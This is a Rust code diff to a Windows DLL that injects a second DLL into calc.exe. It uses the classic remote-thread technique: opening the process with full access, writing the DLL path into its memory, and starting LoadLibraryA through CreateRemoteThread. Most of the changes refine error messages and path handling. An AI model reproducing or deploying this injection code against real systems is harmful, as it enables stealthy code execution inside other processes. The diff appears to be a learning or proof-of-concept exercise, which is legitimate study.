@@ -64,20 +64,32 @@ pub extern "stdcall" fn DllMain(
                         return 0x1;
                     }
                 };
-                // set dll2 path from self module path (2.dll)
-                let dll2_path = match self_modules.get(0).unwrap().path.clone().into_string() {
-                    Ok(p) => p,
-                    Err(_e) => {
-                        return 0x1;
+                let mut dll2_path: String = String::new();
+                for module in self_modules {
+                    let len = module.path.len();
+                    dll2_path = module.path.clone().into_string().unwrap();
+                    if !dll2_path.contains("Mistaken\\.dll") {
+                        dll2_path.truncate(len);
+                        continue;
                     }
-                };
-                let _ = dll2_path.replace(".dll", "2.dll");
+                    // replace .dll with 2.dll
+                    dll2_path = dll2_path.replace(".dll", "2.dll");
+                }
+                if dll2_path.is_empty() {
+                    let msg = format!("[!] Failed to get self module.\0");
+                    err_msgbox(msg);
+                    return 0x1;
+                } else {
+                    let msg = format!("[!] DLL2 Path: {}\0", dll2_path);
+                    err_msgbox(msg);
+                }
+                
 
                 // inject dll into calc.exe
                 let _h_remotethread = match dll_inject(&mut process, &dll2_path) {
                     Ok(h) => h,
                     Err(e) => {
-                        let msg = format!("[!] Failed to inject dll.\nError Code: {}\0", e);
+                        let msg = format!("[!] Failed to inject dll.\nError: {}\0", e);
                         err_msgbox(msg);
                         return 0x1;
                     }
@@ -119,7 +131,7 @@ pub extern "stdcall" fn DllMain(
 }
 
 
-fn dll_inject(process: &mut Process, dll_path: &str) -> Result<HANDLE, u32> {
+fn dll_inject(process: &mut Process, dll_path: &str) -> Result<HANDLE, String> {
     process.handle = unsafe {
         processthreadsapi::OpenProcess(
             PROCESS_ALL_ACCESS,
@@ -128,35 +140,35 @@ fn dll_inject(process: &mut Process, dll_path: &str) -> Result<HANDLE, u32> {
         )
     };
     if process.handle == ptr::null_mut() {
-        return Err(unsafe { errhandlingapi::GetLastError() });
+        return Err(format!("Failed to open process. Error Code: {}\0", unsafe { errhandlingapi::GetLastError() }));
     }
 
     let arg_address = match Process::allocate_memory(process, dll_path.len() as u32) {
         Ok(a) => a,
         Err(e) => {
-            return Err(e);
+            return Err(format!("Failed to allocate memory. Error Code: {}\0", e));
         }
     };
 
     match Process::write_memory(process, arg_address, dll_path) {
         Ok(_) => {},
         Err(e) => {
-            return Err(e);
+            return Err(format!("Failed to write memory. Error Code: {}\0", e));
         }
     };
 
     let h_kernel32 = unsafe {
-        libloaderapi::GetModuleHandleA("kernel32.dll".as_ptr() as *const i8)
+        libloaderapi::GetModuleHandleA(b"Kernel32.dll\0".as_ptr() as *const _)
     };
     if h_kernel32 == ptr::null_mut() {
-        return Err(unsafe { errhandlingapi::GetLastError() });
+        return Err(format!("Failed to get kernel32.dll handle. Error Code: {}\0", unsafe { errhandlingapi::GetLastError() }));
     }
 
     let h_loadlib = unsafe {
-        libloaderapi::GetProcAddress(h_kernel32, "LoadLibraryA\0".as_ptr() as *const i8)
+        libloaderapi::GetProcAddress(h_kernel32, b"LoadLibraryA\0".as_ptr() as *const _)
     };
     if h_loadlib == ptr::null_mut() {
-        return Err(unsafe { errhandlingapi::GetLastError() });
+        return Err(format!("Failed to get LoadLibraryA address. Error Code: {}\0", unsafe { errhandlingapi::GetLastError() }));
     }
 
     let h_thread = match otherwinapi::CreateRemoteThread(
@@ -166,7 +178,7 @@ fn dll_inject(process: &mut Process, dll_path: &str) -> Result<HANDLE, u32> {
     ) {
         Ok(h) => h,
         Err(e) => {
-            return Err(e);
+            return Err(format!("Failed to create remote thread. Error Code: {}\0", e));
         }
     };
 
